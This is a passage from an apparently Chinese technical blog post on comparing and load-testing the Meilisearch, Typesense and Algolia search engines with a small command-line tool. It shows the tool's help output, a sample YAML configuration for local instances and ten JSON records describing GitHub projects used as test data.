data-num=\"17\"></td><td><pre>   search, s         search</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   pressureTest, pt  pressureTest</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   help, h           Shows a list of commands or <span class=\"token builtin class-name\">help</span> <span class=\"token keyword\">for</span> one <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>GLOBAL OPTIONS:</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>   <span class=\"token parameter variable\">--config</span> value, <span class=\"token parameter variable\">-c</span> value  config <span class=\"token function\">file</span> path <span class=\"token punctuation\">(</span>default: <span class=\"token string\">\"./config.yaml\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>   <span class=\"token parameter variable\">--engine</span> value, <span class=\"token parameter variable\">-e</span> value  <span class=\"token builtin class-name\">set</span> search engine<span class=\"token punctuation\">;</span> m as meillsearch, t as typesense, a as aligolia ,all</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   --help, <span class=\"token parameter variable\">-h</span>                show <span class=\"token builtin class-name\">help</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>   --version, <span class=\"token parameter variable\">-v</span>             print the version</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>COPYRIGHT:</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>   <span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token number\">2023</span> Twelveeee @ Twelveeee</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span></pre></td></tr></table></figure><h3 id=\"config\"><a class=\"anchor\" href=\"#config\">#</a> config</h3>\n<figure class=\"highlight yaml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 导入数据存放文件未知</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token key atrule\">DataFile</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"./data/data.json\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token key atrule\">MeillSearch</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token key atrule\">Host</span><span class=\"token punctuation\">:</span>  <span class=\"token string\">\"http://localhost:7700\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token key atrule\">APIKey</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"aSampleMasterKey\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token key atrule\">IndexName</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"article\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token key atrule\">Typesense</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token key atrule\">Host</span><span class=\"token punctuation\">:</span>  <span class=\"token string\">\"http://localhost:8108\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token key atrule\">APIKey</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"xvRbulP1P0Rw3h9ZFuT8yQH0sc35JLLj9SkwGPCyDbrkPDIp\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token key atrule\">IndexName</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"article\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token key atrule\">Algolia</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token key atrule\">ApplicationId</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token key atrule\">AdminApiKey</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token key atrule\">IndexName</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"article\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 测试</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token key atrule\">TestRate</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\"># 每秒次数</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token key atrule\">PerSecond</span><span class=\"token punctuation\">:</span> <span class=\"token number\">100</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\"># 持续时间</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token key atrule\">Duration</span><span class=\"token punctuation\">:</span> <span class=\"token number\">60</span></pre></td></tr></table></figure><h3 id=\"data-demo\"><a class=\"anchor\" href=\"#data-demo\">#</a> data demo</h3>\n<p>这里提供了 10 条数据，实际测试数据大约为 3000 条</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"rid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"09b983b090264286865e3bcef616cb8a\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"教程 Python\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"michaelliao\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author_avatar\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://img.hellogithub.com/github_avatar/470058.png!small\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"awesome-python-webapp\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"full_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"michaelliao/awesome-python-webapp\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Python 小白的入门实战教程\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"小白的Python入门教程实战篇：网站+iOS App源码\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"summary\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"廖老师的免费 Python 入门教程，实践部分的代码。\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"lang_color\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"#24292e\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"primary_lang\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Other\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars\"</span><span class=\"token operator\">:</span> <span class=\"token number\">2151</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars_str\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2.2k\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"publish_at\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2014-12-28 13:13:43\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"has_chinese\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"is_active\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"rid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"61be747e0e14438c804bed7db016d6b5\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Web 应用 Tornado Python 归档\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"phith0n\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author_avatar\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://img.hellogithub.com/github_avatar/5711185.png!small\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Minos\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"full_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"phith0n/Minos\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"基于 Tornado 的简约社区系统\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"一个基于Tornado/mongodb/redis的社区系统。\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"summary\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"一个基于 Tornado+MongoDB+Redis 构建的社区系统。\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"lang_color\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"#f1e05a\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"primary_lang\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"JavaScript\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars\"</span><span class=\"token operator\">:</span> <span class=\"token number\">681</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars_str\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"681\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"publish_at\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2019-08-10 22:41:31\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"has_chinese\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"is_active\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"rid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"411d211476a8475dbafa75dc223d27e0\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"数据分析 Python\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"waditu\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author_avatar\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://img.hellogithub.com/github_avatar/10395504.jpeg!small\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"tushare\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"full_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"waditu/tushare\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"金融数据分析的 Python 工具包\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"TuShare is a utility for crawling historical data of China stocks\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"summary\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"这是一个免费、开源的 Python 财经数据接口包，实现了对股票、期货等金融数据，从数据采集、清洗加工到数据存储过程。\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"lang_color\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"#3572A5\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"primary_lang\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Python\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars\"</span><span class=\"token operator\">:</span> <span class=\"token number\">12388</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars_str\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"12.4k\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"publish_at\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2020-03-04 22:36:33\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"has_chinese\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"is_active\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"rid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2631e0aa82db48aebcea0f0c7968d1b9\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Python\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"wong2\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author_avatar\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://img.hellogithub.com/github_avatar/321947.jpeg!small\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"beijing_bus\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"full_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"wong2/beijing_bus\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"北京实时公交查询工具\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"北京实时公交 for Python\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"summary\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"该项目可以查询北京公交到达某站还需多久。\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"lang_color\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"#3572A5\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"primary_lang\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Python\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars\"</span><span class=\"token operator\">:</span> <span class=\"token number\">373</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars_str\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"373\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"publish_at\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2018-01-30 12:08:22\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"has_chinese\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"is_active\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"rid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"fc76d2b8c6574257b0256850ea309050\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"阿里 TypeScript React JavaScript\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ant-design\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author_avatar\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://img.hellogithub.com/github_avatar/12101536.png!small\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ant-design\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"full_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ant-design/ant-design\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"一套企业级 UI 设计语言和 React 组件库\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"An enterprise-class UI design language and React UI library\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"summary\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"该项目是阿里开源的一套开箱即用的 React 组件库，视觉风格现代化，可用于快速构建企业级的中、后台管理系统。\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"lang_color\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"#2b7489\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"primary_lang\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"TypeScript\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars\"</span><span class=\"token operator\">:</span> <span class=\"token number\">88053</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars_str\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"88.1k\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"publish_at\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2023-10-25 23:19:16\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"has_chinese\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"is_active\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"rid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"eed9fd7cf0a844cca6a7b62d06d07fec\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Lua Nginx Python 归档\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"alexazhou\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author_avatar\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://img.hellogithub.com/github_avatar/9353779.jpeg!small\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"VeryNginx\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"full_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"alexazhou/VeryNginx\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"一个功能强大且友好的 Nginx 扩展项目\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\" A very powerful and friendly  nginx base on lua-nginx-module( openresty ) which provide WAF, Control Panel, and Dashboards. \"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"summary\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"基于 lua_nginx_module(openrestry) 开发，实现了高级的防火墙、访问统计和 Web 界面等功能的 Nginx 扩展程序。\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"lang_color\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"#000080\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"primary_lang\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Lua\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars\"</span><span class=\"token operator\">:</span> <span class=\"token number\">5916</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars_str\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"5.9k\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"publish_at\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2019-10-26 23:19:02\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"has_chinese\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"is_active\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"rid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"d50eb59a63c74ae2b9d3f841abbad86f\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"JavaScript 归档\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"disjukr\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author_avatar\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://img.hellogithub.com/github_avatar/690661.png!small\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"activate-power-mode\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"full_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"disjukr/activate-power-mode\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"爆炸输入效果\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Activate POWER MODE anywhere\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"summary\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"采用 JavaScript 实现的炫酷输入效果。\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"lang_color\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"#f1e05a\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"primary_lang\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"JavaScript\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars\"</span><span class=\"token operator\">:</span> <span class=\"token number\">416</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars_str\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"416\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"publish_at\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2017-04-29 16:52:14\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"has_chinese\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"is_active\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"rid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"bbe2e588690446ccba3a06fcd2ea944d\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CSS\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"sofish\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author_avatar\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://img.hellogithub.com/github_avatar/153183.png!small\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"typo.css\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"full_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"sofish/typo.css\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"用于构建适合中文阅读网页的 CSS\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"中文网页重设与排版：一致化浏览器排版效果，构建最适合中文阅读的网页排版\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"summary\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"该项目提供一致化浏览器排版效果的同时，构建最适合中文阅读的网页排版，支持桌面和移动平台。\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"lang_color\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"#e34c26\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"primary_lang\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"HTML\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars\"</span><span class=\"token operator\">:</span> <span class=\"token number\">4442</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars_str\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"4.4k\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"publish_at\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2020-07-17 11:15:31\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"has_chinese\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"is_active\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"rid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"4949f0ae191a4967a20f120ffaac6798\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"书籍 Python\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"yidao620c\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"author_avatar\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://img.hellogithub.com/github_avatar/1510785.jpeg!small\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"python3-cookbook\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"full_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"yidao620c/python3-cookbook\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"《Python Cookbook》 中文版\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"《Python Cookbook》 3rd Edition Translation\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"summary\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"该书是 Python3 的工具书，里面包含了 Python3 各种实用的知识点和代码片段，适合想深入学习 Python 和想提高编程水平的 Python 爱好者。\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"lang_color\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"#DA5B0B\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"primary_lang\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Jupyter Notebook\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars\"</span><span class=\"token operator\">:</span> <span class=\"token number\">11041</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"stars_str\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"11k\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"publish_at\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2023-07-02 00:15:02\"</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"has_chinese\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token property\">\"is_active\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h2 id=\"meilisearch\"><a class=\"anchor\" href=\"#meilisearch\">#</a> Meilisearch</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWVpbGlzZWFyY2guY29tL2RvY3MvbGVhcm4vZ2V0dGluZ19zdGFydGVkL3F1aWNrX3N0YXJ0\">https://www.meilisearch.com/docs/learn/getting_started/quick_start</span></p>\n<h3 id=\"搭建\"><a class=\"anchor\" href=\"#搭建\">#</a> 搭建</h3>\n<figure class=\"highlight bash\"><figcaption 